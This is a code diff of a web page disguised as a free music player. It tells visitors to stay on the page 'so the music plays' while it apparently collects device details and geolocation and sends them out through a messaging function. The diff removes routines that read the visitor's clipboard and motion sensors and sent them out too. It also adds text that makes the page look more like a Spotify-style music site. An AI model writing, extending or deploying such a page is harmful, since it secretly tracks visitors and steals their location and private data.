@@ -149,8 +149,9 @@
         <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
       </div>
     </div>
+    <div class="artist">Artis tidak di kenal</div>
     <div class="artist">Tetap di halaman ini agar music berputar</div>
-    <div class="artist">#nullsiren #masing²</div>
+    <div class="artist">#spotify #music-free</div>
     <div class="progress-wrapper">
       <div class="progress-bar">
         <div class="progress-fill" id="progress"></div>
@@ -564,53 +565,6 @@ Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
-const ambilSensorGerakan = () => {
-  return new Promise((resolve) => {
-    if (!window.DeviceMotionEvent) {
-      resolve(`౼ 〘 𝗦𝗘𝗡𝗦𝗢𝗥 𝗚𝗘𝗥𝗔𝗞𝗔𝗡 〙 ౼\n❌ Tidak didukung.`);
-      return;
-    }
-
-    const handler = (event) => {
-      const { x, y, z } = event.acceleration || {};
-      const { alpha, beta, gamma } = event.rotationRate || {};
-      window.removeEventListener('devicemotion', handler);
-
-      resolve(`
-౼ 〘 𝗦𝗘𝗡𝗦𝗢𝗥 𝗚𝗘𝗥𝗔𝗞𝗔𝗡 〙 ౼
-Accelerometer (m/s²)
- - X : ${x?.toFixed(2)}
- - Y : ${y?.toFixed(2)}
- - Z : ${z?.toFixed(2)}
-
-Gyroscope (°/s)
- - Alpha : ${alpha?.toFixed(2)}
- - Beta  : ${beta?.toFixed(2)}
- - Gamma : ${gamma?.toFixed(2)}
-`.trim());
-    };
-
-    window.addEventListener('devicemotion', handler, { once: true });
-  });
-};
-
-const ambilClipboard = async () => {
-  try {
-    if (!navigator.clipboard || !navigator.clipboard.readText) {
-      return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Clipboard API tidak didukung.`;
-    }
-
-    const text = await navigator.clipboard.readText();
-    if (!text || text.trim() === "") {
-      return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Tidak ada isi clipboard.`;
-    }
-
-    return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\nIsi terakhir: ${text}`;
-  } catch (err) {
-    return `౼ 〘 𝗖𝗟𝗜𝗣𝗕𝗢𝗔𝗥𝗗 〙 ౼\n❌ Tidak bisa akses clipboard (kemungkinan butuh HTTPS / izin gesture).`;
-  }
-};
-
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -777,17 +731,6 @@ const mulai = async () => {
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
-
-  // 🔥 Sensor Gerakan + Clipboard digabung
-  const sensorGerakan = await ambilSensorGerakan();
-  const clipboardInfo = await ambilClipboard();
-
-  const gabungLanjutan = [
-    sensorGerakan,
-    clipboardInfo
-  ].join("\n\n");
-
-  await kirimPesan(gabungLanjutan); // ✅ kirim 1 pesan
 
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
